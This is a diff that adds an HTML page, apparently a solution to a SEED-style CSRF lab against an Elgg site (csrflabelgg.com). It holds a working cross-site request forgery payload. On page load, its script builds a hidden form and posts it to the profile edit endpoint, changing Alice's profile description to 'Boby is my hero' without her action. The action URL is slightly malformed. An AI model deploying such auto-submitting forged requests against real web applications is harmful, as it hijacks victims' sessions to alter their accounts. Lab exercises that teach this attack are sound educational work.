@@ -1,0 +1,28 @@
+<html>
+  <body>
+    <h1> Alice, vamos a cambiar tu informacion! </h1>
+ 	<script type="text/javascript">
+          function forgePost()
+	  {
+		var fields;
+		fields += "<input type= 'hidden' name='name' value ='Alice'>";
+		fields += "<input type= 'hidden' name='briefdescription' value ='Boby is my hero'>";
+		fields += "<input type= 'hidden' name='accesslevel[briefdescription]' value ='2'>";
+		fields += "<input type= 'hidden' name='guid' value ='42'>";
+
+		var p = document.createElement("form");
+
+		p.action= "http:www.csrflabelgg.com/action/profile/edit";
+		p.innerHTML = fields;
+		p.method = "post";
+
+		document.body.appendChild(p);
+
+		p.submit();
+
+         }
+
+	  window.onload = function() { forgePost(); }
+        </script>
+  </body>
+</html>
